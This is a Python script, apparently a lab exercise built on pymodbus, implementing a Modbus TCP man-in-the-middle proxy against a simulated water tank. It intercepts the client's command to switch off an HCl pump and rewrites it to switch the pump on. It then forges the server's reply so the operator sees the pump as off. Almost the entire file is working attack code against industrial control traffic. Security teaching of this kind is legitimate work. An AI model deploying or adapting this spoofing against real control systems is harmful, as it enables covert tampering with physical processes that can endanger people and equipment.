#!/usr/bin/env python3
"""Pymodbus asynchronous man-in-the-middle example.

usage::

    python3 mitm_async.py

The corresponding server must be started before e.g. as:
    python3 waterTank.py dt.json

The corresponding client must be started after e.g. as:
    python3 client_async.py -c tcp -p 5030

"""
import asyncio
import logging
import sys
import pdb

try:
    import helper
except ImportError:
    print("*** ERROR --> THIS EXAMPLE needs the example directory, please see \n\
          https://pymodbus.readthedocs.io/en/latest/source/examples.html\n\
          for more information.")
    sys.exit(-1)

import pymodbus.client as modbusClient
from pymodbus import ModbusException


_logger = logging.getLogger(__file__)
logging.basicConfig(filename='mitm_async.log', level=logging.DEBUG)
_logger.setLevel("DEBUG")

# Host and Port information to create the MITM
MITM_PROXY_HOST = "127.0.0.1"
MITM_PROXY_PORT = 5030
ACTUAL_SERVER_HOST = "127.0.0.1"
ACTUAL_SERVER_PORT = 5020

global changeData

class MITMModbusProxy:
    def __init__(self, client_host, client_port, server_host, server_port):
        self.client_host = client_host
        self.client_port = client_port
        self.server_host = server_host
        self.server_port = server_port
    
    async def proxy(self, reader, writer):
        client_addr = writer.get_extra_info("peername")
        print(f">> Connected to client: {client_addr}")

        server_reader, server_writer = await asyncio.open_connection(
            self.server_host, self.server_port
        )
        print(f">> Connected to server at {self.server_host}:{self.server_port}\n")
        changeData = False

        try:
            while True:
                data = await reader.read(1024)
                if not data:
                    break

                parsed_data_map = self.parse_data(data)
                
                # If the client is trying to shut off the HCl pump for the first time (i.e. changeData == False)
                if parsed_data_map['function_code'] == 0x05 and parsed_data_map["quantity_of_coils"] == b'\x00\x00' and not changeData:
                    changeData = True
                
                # Manipulate the data if needed, else pass along the normal client data
                manipulated_data = self.transform_client_data(parsed_data_map) if changeData else data
                        
                # Forward to the server
                server_writer.write(manipulated_data)
                await server_writer.drain()

                # Await the server's response
                response = await server_reader.read(1024)
                if not response:
                    break

                # TODO: Manipulate server data here, if desired
                parsed_response_map = self.parse_response(response)
                manipulated_data = self.transform_server_data(parsed_response_map) if changeData else response
                
                # Write the response back to the client
                writer.write(manipulated_data)
                await writer.drain()

        except Exception as e:
            print(f"Error: {e}")
        finally:
            print(f">> Closing connection to client: {client_addr}")
            print("-"*50)
            writer.close()
            server_writer.close()

    async def start(self):
        server = await asyncio.start_server(
            self.proxy, self.client_host, self.client_port
        )
        print(f"MITM Proxy running on {self.client_host}:{self.client_port}")
        print("-"*50)
        async with server:
            await server.serve_forever()

    def transform_client_data(self, parsed_data_map):
        # print("transforming client data to spoof server...")

        # Case 1: if the function_code is 'Write Single Register' and the value is 0
        if parsed_data_map['function_code'] == 0x05 and parsed_data_map["quantity_of_coils"] == b'\x00\x00':
            old_value = parsed_data_map["quantity_of_coils"]
            parsed_data_map["quantity_of_coils"] = b'\xFF\x00'
            print(f"\t**Spoofing client command: WRITE {old_value} --> WRITE {parsed_data_map["quantity_of_coils"]}")
        
        manipulated_data = self.create_new_command(parsed_data_map)

        return manipulated_data

    def transform_server_data(self, parsed_response_map):
        # print("transforming server data to spoof client...")

        # Case 1: Response to Client Case 1 (Write Register with value 0)
        if parsed_response_map['function_code'] == 0x05 and parsed_response_map["quantity_of_coils"] == b'\xff\x00':
            old_value = parsed_response_map["quantity_of_coils"]
            parsed_response_map["quantity_of_coils"] = b'\x00\x00'
            print(f"\t**Spoofing server command: WRITE {old_value} --> WRITE {parsed_response_map["quantity_of_coils"]}\n")
        
        manipulated_data = self.create_new_command(parsed_response_map)
        return manipulated_data

    def parse_data(self, data):
        parsed_data = {}
        parsed_data["transaction_id"] = data[0:2]
        parsed_data["protocol_id"] = data[2:4]
        parsed_data["length"] = data[4:6]
        parsed_data["unit_id"] = data[6]
        parsed_data["function_code"] = data[7]
        parsed_data["starting_addr"] = data[8:10]
        parsed_data["quantity_of_coils"] = data[10:12]

        return parsed_data
    
    def parse_response(self, response):
        parsed_response = {}
        parsed_response["transaction_id"] = response[0:2]
        parsed_response["protocol_id"] = response[2:4]
        parsed_response["length"] = response[4:6]
        parsed_response["unit_id"] = response[6]
        parsed_response["function_code"] = response[7]
        parsed_response["starting_addr"] = response[8:10]
        parsed_response["quantity_of_coils"] = response[10:12]

        return parsed_response    

    def create_new_command(self, parsed_data_map):
        manipulated_data = b''

        manipulated_data += (parsed_data_map["transaction_id"])
        manipulated_data += (parsed_data_map["protocol_id"])
        manipulated_data += (parsed_data_map["length"])
        manipulated_data += (parsed_data_map["unit_id"]).to_bytes(1, byteorder='big')
        manipulated_data += (parsed_data_map["function_code"]).to_bytes(1, byteorder='big')
        manipulated_data += (parsed_data_map["starting_addr"])
        manipulated_data += (parsed_data_map["quantity_of_coils"])
        
        return manipulated_data

if __name__ == "__main__":
    proxy = MITMModbusProxy(
        MITM_PROXY_HOST, MITM_PROXY_PORT, ACTUAL_SERVER_HOST, ACTUAL_SERVER_PORT
    )
    asyncio.run(proxy.start())
